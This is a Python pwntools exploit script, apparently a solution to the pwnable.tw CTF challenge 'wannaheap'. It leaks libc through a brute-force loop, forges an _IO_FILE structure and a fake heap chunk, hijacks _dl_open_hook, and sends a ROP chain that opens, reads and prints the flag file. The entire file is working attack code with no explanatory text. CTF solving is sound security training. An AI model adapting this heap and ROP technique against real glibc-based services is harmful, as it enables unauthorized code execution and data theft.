from utils.IO_FILE import *

elf = ELF('wannaheap')
libc = ELF('libc.so')


def create(key, data):
    r.sendafter(b'> ', b'A')
    r.sendafter(b'key :', key)
    r.sendafter(b'data :', data)


def show(key):
    r.sendafter(b'> ', b'R')
    r.sendafter(b'key:', key)
    return r.recvline()[7:-1]


mmap_size = 0x314000

stdin_struct_offset = 0x3c18c0
stdin_buf_base_offset = stdin_struct_offset + 0x38
stdin_lock_offset = 0x3c3770
stdout_struct_offset = 0x3c2600
dl_open_hook_offset = 0x3c62e0
IO_file_jumps_offset = 0x3be400

L_nop = 0x10f80
L_pop_rdi = 0x1fd7a
L_pop_rsi = 0x1fcbd
L_pop_rdx = 0x1b92
L_pop_rax = 0x3a998
L_syscall = 0xbc765
setcontext_gadget = 0x48045
L_set_call = 0x6ebbb  # mov rdi, rax ; call [rax+0x20]

with log.progress('leaking libc') as l:
    while True:
        r = remote('chall.pwnable.tw', 10305)

        r.sendlineafter(b'Size :', str(mmap_size - 0x10 + stdin_buf_base_offset).encode())
        r.sendlineafter(b'Size :', str(0x313370).encode())
        r.sendlineafter(b'Content :', b'AAAA')

        create(b'Z', b'AAAA')
        create(b'1\x89', b'a' * 0x9)

        try:
            stdout_struct_addr = u64(b'\x00' + show(b'1\x89')[9:] + b'\x00\x00')
            libc_base = stdout_struct_addr - stdout_struct_offset
            l.success('libc_base: ' + hex(libc_base))
            break
        except:
            r.close()
            continue

r.send(b'R')
r.send(p64(libc_base + stdin_buf_base_offset + 0x1200))

with log.progress('creating file structure') as l:
    IO_file = IO_FILE_plus(arch=64)
    stream = IO_file.construct(buf_end=libc_base + stdin_buf_base_offset + 0x1200,
                               lock=libc_base + stdin_lock_offset,
                               mode=0xffffffff,
                               vtable=libc_base + IO_file_jumps_offset)
    stream = stream[0x40:]
    fake_chunk = p64(0) + p64(0x3f1) + p64(0) + p64(
        libc_base + dl_open_hook_offset - 0x10) + b'AZ\x00\x00\x00\x00\x00\x00'
    ROPchain = p64(libc_base + L_pop_rdi) + p64(libc_base + stdin_struct_offset + 0x1e0) + \
               p64(libc_base + L_pop_rsi) + p64(0) + \
               p64(libc_base + L_pop_rdx) + p64(0) + \
               p64(libc_base + L_pop_rax) + p64(2) + \
               p64(libc_base + L_syscall) + \
               p64(libc_base + L_pop_rdi) + p64(1) + \
               p64(libc_base + L_pop_rsi) + p64(libc_base + stdin_struct_offset + 0x1e0) + \
               p64(libc_base + L_pop_rdx) + p64(0x100) + \
               p64(libc_base + L_pop_rax) + p64(0) + \
               p64(libc_base + L_syscall) + \
               p64(libc_base + L_pop_rdi) + p64(0) + \
               p64(libc_base + L_pop_rsi) + p64(libc_base + stdin_struct_offset + 0x1e0) + \
               p64(libc_base + L_pop_rdx) + p64(0x100) + \
               p64(libc_base + L_pop_rax) + p64(1) + \
               p64(libc_base + L_syscall)
    argument = b'/home/wannaheap/flag\x00'
    l.success()

with log.progress('sending ropchain') as l:
    func_ptrs = p64(libc_base + 0x3bdec0) + p64(0) + p64(libc_base + 0x88680) + p64(libc_base + 0x88260) + p64(0) + p64(
        0)
    fake_main_arena = p32(0) + p32(1) + p64(0) * 10 + p64(libc_base + L_set_call) + p64(0) + p64(
        libc_base + stdin_struct_offset + 0xe0) + p64(libc_base + stdin_struct_offset + 0xe0)
    fake_frame = p64(libc_base + setcontext_gadget) + p64(0) * 15 + p64(libc_base + stdin_struct_offset + 0x108) + p64(
        libc_base + L_nop)

    payload = stream + fake_chunk + (ROPchain + argument).ljust(0x108,
                                                                b'\x00') + func_ptrs + fake_main_arena + fake_frame
    sleep(1)
    r.send(payload)
    l.success()

with log.progress('retriving flag') as l:
    r.recvuntil(b"FLAG")
    flag = r.recvline().decode()
    l.success("FLAG" + flag)
